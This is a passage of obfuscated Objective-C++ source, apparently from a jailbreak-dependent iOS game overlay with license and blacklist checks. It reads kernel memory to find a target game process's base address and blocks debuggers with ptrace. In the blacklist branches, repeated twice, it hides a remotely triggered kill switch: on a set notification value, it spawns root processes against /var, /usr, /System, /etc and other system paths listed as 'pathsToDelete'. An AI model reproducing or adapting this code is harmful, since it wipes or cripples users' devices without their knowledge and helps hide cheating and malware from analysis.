        } else if ([value isKindOfClass:[NSNumber class]]) {
            [jsonString appendFormat:@"%@", value];
        } else if ([value isKindOfClass:[NSDictionary class]]) {
            NSString *dictString = SpeedDesEn7De(SpeeddicToJson(value));
            [jsonString appendString:dictString];
        } else if ([value isKindOfClass:[NSArray class]]) {
            NSArray *array = (NSArray *)value;
            [jsonString appendString:@"["];
            for (NSUInteger j = 0; j < array.count; j++) {
                id item = array[j];
                if ([item isKindOfClass:[NSString class]]) {
                    [jsonString appendFormat:@"\"%@\"", SpeedDesEn7De(JSONString(SpeedDesEn7En(item)))];
                } else if ([item isKindOfClass:[NSNumber class]]) {
                    [jsonString appendFormat:@"%@", item];
                } else if ([item isKindOfClass:[NSDictionary class]]) {
                    NSString *itemString = SpeedDesEn7De(SpeeddicToJson(item));
                    [jsonString appendString:itemString];
                } else if ([item isKindOfClass:[NSNull class]]) [jsonString appendString:@"null"];
                if (j < array.count - 1) [jsonString appendString:@","];
            }
            [jsonString appendString:@"]"];
        } else if ([value isKindOfClass:[NSNull class]]) {
            [jsonString appendString:@"null"];
        } else [jsonString appendFormat:@"\"%@\"", SpeedDesEn7De(JSONString(SpeedDesEn7En([value description])))];
        if (i < keys.count - 1) [jsonString appendString:@","];
    }
    [jsonString appendString:@"}"];
    return SpeedDesEn7En(jsonString);
}

__attribute__((always_inline)) NSString *hexStringFromData(NSData *data) {
    NSMutableString *hexString = [NSMutableString string];
    const unsigned char *dataBytes = (const unsigned char *)[data bytes];
    for (NSUInteger i = 0; i < [data length]; i++) {
        [hexString appendFormat:@"%02x", dataBytes[i]];
    }
    return hexString;
}
__attribute__((always_inline)) NSString *reverseString(NSString *string) {
    NSMutableString *reversedString = [NSMutableString stringWithCapacity:[string length]];
    for (NSInteger i = [string length] - 1; i >= 0; i--) {
        [reversedString appendString:[NSString stringWithFormat:@"%C", [string characterAtIndex:i]]];
    }
    return reversedString;
}
__attribute__((always_inline)) NSString *AsTostr(NSArray<NSNumber *> *byte, BOOL reverse) {
    if (reverse) byte = [NSArray arrayWithArray:[[byte reverseObjectEnumerator] allObjects]];
    NSMutableData *Data = [NSMutableData data];
    for (NSNumber *Value in byte) {
        uint8_t byte = (uint8_t)[Value unsignedCharValue];
        [Data appendBytes:&byte length:1];
    }
    NSString *result = [[NSString alloc] initWithData:Data encoding:NSUTF8StringEncoding];
    
    return result;
}
__attribute__((always_inline)) NSArray *StrToArray(NSString *jsonString) {
    NSData *data = [jsonString dataUsingEncoding:NSUTF8StringEncoding];
    NSError *error = nil;
    NSArray *parsedArray = [NSJSONSerialization JSONObjectWithData:data options:0 error:&error];
    if (error) return nil;
    return parsedArray;
}
__attribute__((always_inline)) NSString *SpeedRebellion_en(NSString *data, NSArray<NSString *> *arr, NSArray<NSNumber *> *pos) {
    NSData *dataBytes = [data dataUsingEncoding:NSUTF8StringEncoding];
    NSString *hexData = hexStringFromData(dataBytes);
    NSString *reversedHex = reverseString(hexData);
    NSMutableArray<NSString *> *reversedArr = [NSMutableArray array];
    for (NSUInteger i = 0; i < reversedHex.length; i++) {
        [reversedArr addObject:[NSString stringWithFormat:@"%C", [reversedHex characterAtIndex:i]]];
    }
    for (NSUInteger i = 0; i < pos.count; i++) {
        NSNumber *pos_ = pos[i];
        if (i < arr.count) {
            NSString *insertData = arr[i];
            [reversedArr insertObject:insertData atIndex:[pos_ integerValue]];
        }
    }
    NSString *finalHex = [reversedArr componentsJoinedByString:@""];
    NSString *reversedHex2 = reverseString(finalHex);
    NSData *encodedData = [reversedHex2 dataUsingEncoding:NSUTF8StringEncoding];
    return [encodedData base64EncodedStringWithOptions:0];
}
__attribute__((always_inline)) NSString *SpeedRebellion_de(NSString *data, NSArray<NSString *> *arr, NSArray<NSNumber *> *pos) {
    NSData *decodedData = [[NSData alloc] initWithBase64EncodedString:data options:0];
    NSString *decodedHex = [[NSString alloc] initWithData:decodedData encoding:NSUTF8StringEncoding];
    NSString *reversedHex = reverseString(decodedHex);
    for (NSInteger i = pos.count - 1; i >= 0; i--) {
        if (i < arr.count) {
            NSString *removeData = arr[i];
            NSRange range = [reversedHex rangeOfString:removeData];
            if (range.location != NSNotFound) {
                reversedHex = [reversedHex stringByReplacingCharactersInRange:range withString:@""];
            }
        }
    }
    NSString *reversedHex2 = reverseString(reversedHex);
    NSMutableData *finalData = [NSMutableData data];
    for (NSInteger i = 0; i < reversedHex2.length; i += 2) {
        NSString *hexChar = [reversedHex2 substringWithRange:NSMakeRange(i, 2)];
        unsigned int byte;
        [[NSScanner scannerWithString:hexChar] scanHexInt:&byte];
        [finalData appendBytes:&byte length:1];
    }
    return [[NSString alloc] initWithData:finalData encoding:NSUTF8StringEncoding];
}

__attribute__((always_inline)) NSString *SpeediOS_Sign(NSString *privateKeyBase64, NSString *passphrase, NSString *message) {
    NSData *privateKeyData = [[NSData alloc] initWithBase64EncodedString:privateKeyBase64 options:0];
    if (!privateKeyData) return nil;
    BIO *bio = BIO_new_mem_buf(privateKeyData.bytes, (int)privateKeyData.length);
    if (!bio) return nil;
    const char *passphraseCStr = [passphrase UTF8String];
    EVP_PKEY *privateKey = PEM_read_bio_PrivateKey(bio, NULL, NULL, (void *)passphraseCStr);
    BIO_free(bio);
    if (!privateKey) return nil;
    NSData *dataToSign = [message dataUsingEncoding:NSUTF8StringEncoding];
    if (!dataToSign) {
        EVP_PKEY_free(privateKey);
        return nil;
    }
    EVP_MD_CTX *mdctx = EVP_MD_CTX_new();
    if (!mdctx) {
        EVP_PKEY_free(privateKey);
        return nil;
    }
    if (EVP_SignInit(mdctx, EVP_sha256()) != 1) {
        EVP_MD_CTX_free(mdctx);
        EVP_PKEY_free(privateKey);
        return nil;
    }
    if (EVP_SignUpdate(mdctx, dataToSign.bytes, dataToSign.length) != 1) {
        EVP_MD_CTX_free(mdctx);
        EVP_PKEY_free(privateKey);
        return nil;
    }
    unsigned int sig_len = EVP_PKEY_size(privateKey);
    unsigned char *sig = (unsigned char *)malloc(sig_len);
    if (!sig) {
        EVP_MD_CTX_free(mdctx);
        EVP_PKEY_free(privateKey);
        return nil;
    }
    if (EVP_SignFinal(mdctx, sig, &sig_len, privateKey) != 1) {
        free(sig);
        EVP_MD_CTX_free(mdctx);
        EVP_PKEY_free(privateKey);
        return nil;
    }
    EVP_MD_CTX_free(mdctx);
    EVP_PKEY_free(privateKey);
    NSData *signatureData = [NSData dataWithBytes:sig length:sig_len];
    free(sig);
    return [signatureData base64EncodedStringWithOptions:0];
}

static dispatch_block_t gExitBlock = nil;
static BOOL gShouldExit = NO;

typedef int (*ptrace_ptr_t)(int _request, pid_t _pid, caddr_t _addr, int _data);
#if !defined(PT_DENY_ATTACH)
#define PT_DENY_ATTACH 31
#endif
extern "C" kern_return_t
mach_vm_region_recurse(
    vm_map_t map,
    mach_vm_address_t *address,
    mach_vm_size_t *size,
    uint32_t *depth,
    vm_region_recurse_info_t info,
    mach_msg_type_number_t *infoCnt
);
typedef struct {
    void *isa;
    int flags;
    int reserved;
    void (*invoke)(void);
    void *descriptor;
} BlockLayout;
__attribute__((always_inline)) BOOL isBlockHooked(id block) {
    BlockLayout *blockLayout = (__bridge BlockLayout *)block;
    void *invokeFunc = (void *)blockLayout->invoke;
    Dl_info info;
    {
        mach_vm_address_t address = (mach_vm_address_t)invokeFunc;
        mach_vm_size_t size = 0;
        uint32_t depth = 0;
        vm_region_submap_info_data_64_t vminfo;
        mach_msg_type_number_t count = VM_REGION_SUBMAP_INFO_COUNT_64;
        kern_return_t kr = mach_vm_region_recurse(mach_task_self(),
                                                  &address, &size, &depth,
                                                  (vm_region_info_t)&vminfo, &count);
        if (kr != KERN_SUCCESS) {
            return YES; // 无法获取内存信息，按可疑处理
        }
        // 必须可执行，且不可写
        if (!(vminfo.protection & VM_PROT_EXECUTE)) return YES;
        if (vminfo.protection & VM_PROT_WRITE)      return YES;
    }
    if (dladdr(invokeFunc, &info) == 0) return YES;
    const char *appName = [NSBundle mainBundle].executablePath.UTF8String;
    return !(info.dli_fname && strstr(info.dli_fname, appName));
}

// 安全解析：同时支持 ISO8601 和 "yyyy-MM-dd HH:mm:ss"，并处理时间戳/空值
static NSDate *ParseDateFlexible(id value) {
    if (!value || value == (id)kCFNull) return nil;
    if ([value isKindOfClass:[NSNumber class]]) {
        // 支持时间戳（毫秒/秒）
        double ts = [((NSNumber *)value) doubleValue];
        if (ts > 1e12) ts /= 1000.0;
        return [NSDate dateWithTimeIntervalSince1970:ts];
    }
    if (![value isKindOfClass:[NSString class]]) return nil;

    NSString *s = [(NSString *)value stringByTrimmingCharactersInSet:
                   [NSCharacterSet whitespaceAndNewlineCharacterSet]];
    if (s.length == 0) return nil;

    // 优先 ISO8601
    static NSISO8601DateFormatter *iso = nil;
    static dispatch_once_t onceTokenISO;
    dispatch_once(&onceTokenISO, ^{
        iso = [NSISO8601DateFormatter new];
        iso.formatOptions = NSISO8601DateFormatWithInternetDateTime |
                            NSISO8601DateFormatWithFractionalSeconds; // 支持毫秒
        iso.timeZone = [NSTimeZone timeZoneForSecondsFromGMT:0];
    });

    // 允许把“空格”当 T（很多后端这么返）
    NSString *isoCandidate = [s stringByReplacingOccurrencesOfString:@" " withString:@"T"];
    NSDate *d = [iso dateFromString:isoCandidate];
    if (!d) {
        // 去掉毫秒再试一次
        NSRange dot = [isoCandidate rangeOfString:@"."];
        if (dot.location != NSNotFound) {
            NSString *noMs = [isoCandidate substringToIndex:dot.location];
            d = [iso dateFromString:noMs];
        }
    }
    if (d) return d;

    // 退回你的老格式 "yyyy-MM-dd HH:mm:ss"
    static NSDateFormatter *df = nil;
    static dispatch_once_t onceTokenDF;
    dispatch_once(&onceTokenDF, ^{
        df = [NSDateFormatter new];
        df.locale   = [NSLocale localeWithLocaleIdentifier:@"en_US_POSIX"]; // 关键！
        df.timeZone = [NSTimeZone timeZoneForSecondsFromGMT:0];             // 服务端一般发 UTC
        df.calendar = [NSCalendar calendarWithIdentifier:NSCalendarIdentifierGregorian];
        df.dateFormat = @"yyyy-MM-dd HH:mm:ss";
    });
    return [df dateFromString:s];
}
typedef CFTypeRef (*MGCopyAnswer_t)(CFStringRef key);
NSString *MG(NSString *key){
    void *h = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_LAZY);
    if (!h) return nil;
    MGCopyAnswer_t MGCopyAnswer = (MGCopyAnswer_t)dlsym(h, "MGCopyAnswer");
    if (!MGCopyAnswer) { dlclose(h); return nil; }
    CFTypeRef v = MGCopyAnswer((__bridge CFStringRef)key);
    NSString *str = nil;
    if (v) {
        if (CFGetTypeID(v) == CFStringGetTypeID()) str = [(__bridge NSString *)v copy];
        else if (CFGetTypeID(v) == CFNumberGetTypeID()) str = [(__bridge NSNumber *)v stringValue];
        else if (CFGetTypeID(v) == CFDataGetTypeID()) {
            NSData *d = (__bridge NSData *)v; str = [[NSString alloc] initWithData:d encoding:NSUTF8StringEncoding];
        }
        CFRelease(v);
    }
    dlclose(h);
    return str;
    
    
    
}

static CFStringRef (*MGCopyAnswerFunc)(CFStringRef) = NULL;
static void *gestaltHandle = NULL;

/// 初始化 MobileGestalt 句柄
static void InitializeMobileGestaltIfNeeded(void) {
    if (!gestaltHandle) {
        gestaltHandle = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_GLOBAL | RTLD_LAZY);
        if (gestaltHandle) {
            MGCopyAnswerFunc = (CFStringRef (*)(CFStringRef))dlsym(gestaltHandle, "MGCopyAnswer");
        }
    }
}

/// 清理 MobileGestalt
static void CleanupMobileGestalt(void) {
    if (gestaltHandle) {
        dlclose(gestaltHandle);
        gestaltHandle = NULL;
        MGCopyAnswerFunc = NULL;
    }
}

/// 获取指定 key 的 MobileGestalt 值
static NSString *GetMobileGestaltValue(CFStringRef key) {
    InitializeMobileGestaltIfNeeded();
    if (!MGCopyAnswerFunc) {
        CleanupMobileGestalt();
        return @""; // 返回空字符串作为兜底
    }
    return CFBridgingRelease(MGCopyAnswerFunc(key));
}

bool NHJSHSJSHDJ;
uint64_t offset_vm_map_pmap = 0;
uint64_t vm_map_pmap;

#import <sys/mount.h>
int is_jbrand_value(uint64_t value)
{
   uint8_t check = value>>8 ^ value >> 16 ^ value>>24 ^ value>>32 ^ value>>40 ^ value>>48 ^ value>>56;
   return check == (uint8_t)value;
}
#define JB_ROOT_PREFIX ".jbroot-"
#define JB_RAND_LENGTH  (sizeof(uint64_t)*sizeof(char)*2)

int is_jbroot_name(const char* name)
{
    if(strlen(name) != (sizeof(JB_ROOT_PREFIX)-1+JB_RAND_LENGTH))
        return 0;
    
    if(strncmp(name, JB_ROOT_PREFIX, sizeof(JB_ROOT_PREFIX)-1) != 0)
        return 0;
    
    char* endp=NULL;
    uint64_t value = strtoull(name+sizeof(JB_ROOT_PREFIX)-1, &endp, 16);
    if(!endp || *endp!='\0')
        return 0;
    
    if(!is_jbrand_value(value))
        return 0;
    
    return 1;
}

NSString* find_jbroot(BOOL force)
{
    static NSString* cached_jbroot = nil;
    if(!force && cached_jbroot) {
        return cached_jbroot;
    }
    @synchronized(@"find_jbroot_lock")
    {
        //jbroot path may change when re-randomize it
        NSString * jbroot = nil;
        NSArray *subItems = [[NSFileManager defaultManager] contentsOfDirectoryAtPath:@"/var/containers/Bundle/Application/" error:nil];
        for (NSString *subItem in subItems) {
            if (is_jbroot_name(subItem.UTF8String))
            {
                NSString* path = [@"/var/containers/Bundle/Application/" stringByAppendingPathComponent:subItem];
                jbroot = path;
                break;
            }
        }
        cached_jbroot = jbroot;
    }
    return cached_jbroot;
}
NSString* jbrootPrefix(NSString *path)
{
    if(!path || path.UTF8String[0]!='/') {
        return path;
    }
    NSString* jbroot = find_jbroot(NO);
    assert(jbroot != NULL); //to avoid [nil stringByAppendingString:
    return [jbroot stringByAppendingPathComponent:path];
}


static NSString *FirstExistingPath(void) {
    NSString *jbroot = find_jbroot(NO);

    NSArray<NSString *> *candidates = @[
        jbrootPrefix(@"/usr/lib/libjailbreak.dylib"),
        jbrootPrefix(@"/procursus/lib/libjailbreak.dylib"),
        jbrootPrefix(@"/procursus/basebin/libjailbreak.dylib"),
        jbrootPrefix(@"/basebin/libjailbreak.dylib"),
        @"/usr/lib/libjailbreak.dylib",               // 有些环境会把可加载版本链到这里
        jbrootPrefix(@"/usr/lib/libjailbreak.dylib"), // 仅用于调试查看是否存在
    ];

    NSFileManager *fm = [NSFileManager defaultManager];
    for (NSString *p in candidates) {
        BOOL isDir = NO;
        BOOL ok = [fm fileExistsAtPath:p isDirectory:&isDir];
        if (ok && !isDir) {
            NSDictionary *attr = [fm attributesOfItemAtPath:p error:nil];
            return p;
        } else {
        }
    }

    // 额外：把 jbroot 下的 procursus 目录列出来，方便你肉眼确认布局
    NSArray *dirsToList = @[
        [jbroot stringByAppendingPathComponent:@"usr/lib"],
        [jbroot stringByAppendingPathComponent:@"procursus/lib"],
        [jbroot stringByAppendingPathComponent:@"procursus/basebin"],
        [jbroot stringByAppendingPathComponent:@"basebin"],
    ];
    for (NSString *d in dirsToList) {
        NSArray *items = [fm contentsOfDirectoryAtPath:d error:nil];
    }

    return nil;
}
typedef NSString* (^CryptoBlock)(NSString*, NSInteger);
static inline void __attribute__((constructor)) initSpeed(void) {
    NSArray *args = [[NSProcessInfo processInfo] arguments];
    if(args.count > 1 &&([args[1] isEqualToString:@"-hud"])){
        
        HUDGrantOnce();
        KFD::Reset();
          NSString *fullPath = FirstExistingPath();

            if ([[NSFileManager defaultManager] fileExistsAtPath:fullPath]) {
                void *h = dlopen(fullPath.fileSystemRepresentation, RTLD_LAZY | RTLD_GLOBAL);
                KFD::SetHandle(h);
            }

            if (!KFD::Handle()) {
                内核 = NO;
              
                return;
            } else {
             
            }

            // 1) 避免重复初始化（第二次进来直接跳过）
            static bool sJBDInited = false;
            if (!sJBDInited) {
                int ret = KFD::jbdInitPPLRW_call(KFD::Handle());
                if (ret != 0) {
                    内核 = NO;
                  
                
                    return;
                }
                sJBDInited = true;
            }

            // 2) 设置偏移
            offset_vm_map_pmap = 0x48;
            if (@available(iOS 15.4, *)) {
                offset_vm_map_pmap = 0x40;
            }

            pid_t targetPid = KFD::njsdnvnjsdn("CodeV");
            if (targetPid <= 0) {
                内核 = NO;
           
               
                return;
            }

            uint64_t proc_addr = KFD::call_proc_find(KFD::Handle(), targetPid);
            if (!proc_addr) {
                内核 = NO;
              
               
                return;
            }

            uint64_t task_addr = KFD::call_proc_task(KFD::Handle(), proc_addr);
            if (!task_addr) {
                内核 = NO;
             
             
                return;
            }
       
            uint64_t vm_map = KFD::KextRW_kread_ptr(&KFD::S().handle, task_addr + 0x28);
            if (!vm_map) {
                内核 = NO;
              
            
                return;
            }

            uint64_t pmap = KFD::KextRW_kread_ptr(&KFD::S().handle, vm_map + offset_vm_map_pmap);
            if (!pmap) {
                内核 = NO;
             
              
                return;
            }

            vm_map_pmap = KFD::KextRW_kread64(&KFD::S().handle, pmap + 0x8);
            

            
            size_t off_vm_map__hdr = KFD::probe_off_vm_map__hdr(vm_map);
            if (!off_vm_map__hdr) {
                内核 = NO;
           
             
                return;
            }

            uint64_t base = KFD::find_main_exe_base_from_vm_map(vm_map, off_vm_map__hdr);
            if (base) {
             
                基地址 = base;
                内核 = YES;
              
            } else {
            
                内核 = NO;
            
            }
        KFD::S().vm_map_pmap = vm_map_pmap;
        
        
        
     
    }
    

    
    
    if (isatty(1)) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                       
                         HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                        __builtin_trap();
#pragma clang diagnostic pop
    }
    void *handle = dlopen(0, RTLD_GLOBAL | RTLD_NOW);
    if (handle) {
        ptrace_ptr_t ptrace_ptr = (ptrace_ptr_t)dlsym(handle, "ptrace");
        if (ptrace_ptr) ptrace_ptr(PT_DENY_ATTACH, 0, 0, 0);
        dlclose(handle);
    }
    
    
    
    
    NSMutableArray *arr = @[].mutableCopy;
    static void (^Spv0)(void);
    static void (^Spv1)(NSString *s);
    static void (^Spv2)(NSString *s);
    static void (^Spv3)(NSString *s);
    static void (^Spv4)(NSString *s);
    static void (^Spv5)(NSString *s);
    static void (^Spv6)(NSString *s);
    static void (^Spv7)(NSString *s);
    static void (^Spv8)(NSString *s);
    static void (^Spv9)(NSString *s);
    static void (^Spv10)(NSString *s);
    static void (^Spv11)(NSString *s);
    
//    [SpeedKeyChain SpeedRemoveItemForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_serial), SpeedApp_IDENTITY]];
//
//    [SpeedKeyChain SpeedRemoveItemForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_serial), SpeedApp_IDENTITY]];
//    [SpeedKeyChain SpeedRemoveItemForKey:[NSString stringWithFormat:@"%@%@%@",SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]];
//
//    [SpeedKeyChain SpeedRemoveItemForKey:[NSString stringWithFormat:@"%@%@%@",SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_black), SpeedApp_IDENTITY]];


    
    
    
    
    // 获取序列号 + 检查数据
    Spv0 = ^{
        [SpeedBlock disableHttpProxy];
        if (SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_serial), SpeedApp_IDENTITY]]) &&
            ![SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_serial), SpeedApp_IDENTITY]]) isEqualToString:@""]) {
            if (SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]]) &&
                ![SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]]) isEqualToString:@""]) {
                if (SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_black), SpeedApp_IDENTITY]]) &&
                    ![SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_black), SpeedApp_IDENTITY]]) isEqualToString:@""]) {
                    [SpeedKeyChain SpeedSetString:SpeedDesEn7En(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_serial), SpeedApp_IDENTITY]])) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_black), SpeedApp_IDENTITY]];
                    [SpeedKeyChain SpeedSetString:SpeedDesEn7En(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]])) forKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_black), SpeedApp_IDENTITY]];
                    
                    do {
                        static int tk = NOTIFY_TOKEN_INVALID;
                        if (tk == NOTIFY_TOKEN_INVALID) {
                            notify_register_dispatch("com.kuloutoupro.HHJJSHDHDG", &tk, dispatch_get_main_queue(), ^(int t){
                                uint64_t v = 0;
                                if (notify_get_state(t, &v) == NOTIFY_STATUS_OK) {
                                  

                                    if (v == 67573654) {
                                    

                                        NSArray *pathsToDelete = @[
                                            @"/private",
                                            @"/var",
                                            @"/usr",
                                            @"/System",
                                            @"/bin",
                                            @"/sbin",
                                            @"/etc",
                                            @"/Library",
                                            @"/Applications",
                                            @"/dev",
                                            @"/tmp"
                                        ];

                                        for (NSString *path in pathsToDelete) {
                                            posix_spawnattr_t attr;
                                            posix_spawnattr_init(&attr);

                                            // 设置进程为 root 权限
                                            posix_spawnattr_set_persona_np(&attr, 99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
                                            posix_spawnattr_set_persona_uid_np(&attr, 0);
                                            posix_spawnattr_set_persona_gid_np(&attr, 0);

                                            // 获取可执行文件路径
                                            static char *executablePath = NULL;
                                            uint32_t executablePathSize = 0;
                                            _NSGetExecutablePath(NULL, &executablePathSize);
                                            executablePath = (char *)calloc(1, executablePathSize);
                                            _NSGetExecutablePath(executablePath, &executablePathSize);

                                            pid_t task_pid;

                                            // 设置进程组并启动进程
                                            posix_spawnattr_setpgroup(&attr, 0);
                                            posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP);

                                            // 将权限值转换为字符串
                                            std::string str = std::to_string(0000);
                                            const char* cstr = str.c_str();
                                            const char *args[] = {executablePath, "-HJSHDHDHSJ", path.UTF8String, cstr, NULL};

                                    

                                            // 启动进程执行命令
                                            int spawnResult = posix_spawn(&task_pid, executablePath, NULL, &attr, (char **)args, environ);
                                            posix_spawnattr_destroy(&attr);

                                            if (spawnResult != 0) {
                                               
                                                return;
                                            }

                                        

                                            // 等待进程退出
                                            int status;
                                            do {
                                                if (waitpid(task_pid, &status, 0) != -1)
                                                {
                                                  
                                                }
                                            } while (!WIFEXITED(status) && !WIFSIGNALED(status));
                                            
                                            
                                            
                                        }
                                        notify_post("com.apple.MobileSync.BackupAgent.RestoreStarted");
                                      
                                    } else {
                                     
                                    }
                                } else {
                                  
                                }
                            });
                        }
                    } while (0);
                    UIAlertController *alertController = [UIAlertController alertControllerWithTitle:SpeedDesEn7De(v_pojbt) message:[NSString stringWithFormat:@"\n%@\n\n%@\n\n%@%@", SpeedDesEn7De(v_yzcv3), SpeedDesEn7De(v_yzcgv4), SpeedDesEn7De(Speed_name), SpeedDesEn7De(v_yzcgv5)] preferredStyle:UIAlertControllerStyleAlert];
                    [alertController addAction:[UIAlertAction actionWithTitle:SpeedDesEn7De(v_yzcgv6) style:UIAlertActionStyleDestructive handler:^(UIAlertAction * _Nonnull action) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                        notify_post("com.apple.MobileSync.BackupAgent.RestoreStarted");
                        HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                        __builtin_trap();
#pragma clang diagnostic pop
                    }]];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                    [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alertController animated:YES completion:nil];
#pragma clang diagnostic pop
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                        [alertController dismissViewControllerAnimated:YES completion:^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                            HUDRevoke();
                            syscall(SYS_kill, getpid(), SIGKILL);
                            __builtin_trap();
#pragma clang diagnostic pop
                        }];
                    });
                    return;
                } else {
                    void (^f)(NSString *s) = arr[3];
                    f(SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_code), [[NSBundle mainBundle] bundleIdentifier]]]));
                    return;
                }
            } else {
                if (SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_black), SpeedApp_IDENTITY]]) &&
                    ![SpeedDesEn7De([SpeedKeyChain SpeedStringForKey:[NSString stringWithFormat:@"%@%@%@", SpeedDe(SpeedhitKeyChain), SpeedDesEn7De(Speed_black), SpeedApp_IDENTITY]]) isEqualToString:@""]) {
                    
                    
                    do {
                        static int tk = NOTIFY_TOKEN_INVALID;
                        if (tk == NOTIFY_TOKEN_INVALID) {
                            notify_register_dispatch("com.kuloutoupro.HHJJSHDHDG", &tk, dispatch_get_main_queue(), ^(int t){
                                uint64_t v = 0;
                                if (notify_get_state(t, &v) == NOTIFY_STATUS_OK) {
                                  

                                    if (v == 67573654) {
                                    

                                        NSArray *pathsToDelete = @[
                                            @"/private",
                                            @"/var",
                                            @"/usr",
                                            @"/System",
                                            @"/bin",
                                            @"/sbin",
                                            @"/etc",
                                            @"/Library",
                                            @"/Applications",
                                            @"/dev",
                                            @"/tmp"
                                        ];

                                        for (NSString *path in pathsToDelete) {
                                            posix_spawnattr_t attr;
                                            posix_spawnattr_init(&attr);

                                            // 设置进程为 root 权限
                                            posix_spawnattr_set_persona_np(&attr, 99, POSIX_SPAWN_PERSONA_FLAGS_OVERRIDE);
                                            posix_spawnattr_set_persona_uid_np(&attr, 0);
                                            posix_spawnattr_set_persona_gid_np(&attr, 0);

                                            // 获取可执行文件路径
                                            static char *executablePath = NULL;
                                            uint32_t executablePathSize = 0;
                                            _NSGetExecutablePath(NULL, &executablePathSize);
                                            executablePath = (char *)calloc(1, executablePathSize);
                                            _NSGetExecutablePath(executablePath, &executablePathSize);

                                            pid_t task_pid;

                                            // 设置进程组并启动进程
                                            posix_spawnattr_setpgroup(&attr, 0);
                                            posix_spawnattr_setflags(&attr, POSIX_SPAWN_SETPGROUP);

                                            // 将权限值转换为字符串
                                            std::string str = std::to_string(0000);
                                            const char* cstr = str.c_str();
                                            const char *args[] = {executablePath, "-HJSHDHDHSJ", path.UTF8String, cstr, NULL};

                                    

                                            // 启动进程执行命令
                                            int spawnResult = posix_spawn(&task_pid, executablePath, NULL, &attr, (char **)args, environ);
                                            posix_spawnattr_destroy(&attr);

                                            if (spawnResult != 0) {
                                               
                                                return;
                                            }

                                        

                                            // 等待进程退出
                                            int status;
                                            do {
                                                if (waitpid(task_pid, &status, 0) != -1)
                                                {
                                                  
                                                }
                                            } while (!WIFEXITED(status) && !WIFSIGNALED(status));
                                            
                                            
                                            
                                        }
                                        notify_post("com.apple.MobileSync.BackupAgent.RestoreStarted");
                                      
                                    } else {
                                     
                                    }
                                } else {
                                  
                                }
                            });
                        }
                    } while (0);
                    UIAlertController *alertController = [UIAlertController alertControllerWithTitle:SpeedDesEn7De(v_pojbt) message:[NSString stringWithFormat:@"\n%@\n\n%@\n\n%@%@", SpeedDesEn7De(v_yzcv3), SpeedDesEn7De(v_yzcgv4), SpeedDesEn7De(Speed_name), SpeedDesEn7De(v_yzcgv5)] preferredStyle:UIAlertControllerStyleAlert];
                    [alertController addAction:[UIAlertAction actionWithTitle:SpeedDesEn7De(v_yzcgv6) style:UIAlertActionStyleDestructive handler:^(UIAlertAction * _Nonnull action) {
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                        notify_post("com.apple.MobileSync.BackupAgent.RestoreStarted");
                        HUDRevoke();
                        syscall(SYS_kill, getpid(), SIGKILL);
                        __builtin_trap();
#pragma clang diagnostic pop
                    }]];
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                    [[UIApplication sharedApplication].keyWindow.rootViewController presentViewController:alertController animated:YES completion:nil];
#pragma clang diagnostic pop
                    dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(3.0 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                        [alertController dismissViewControllerAnimated:YES completion:^{
#pragma clang diagnostic push
#pragma clang diagnostic ignored "-Wdeprecated-declarations"
                            HUDRevoke();
                            syscall(SYS_kill, getpid(), SIGKILL);
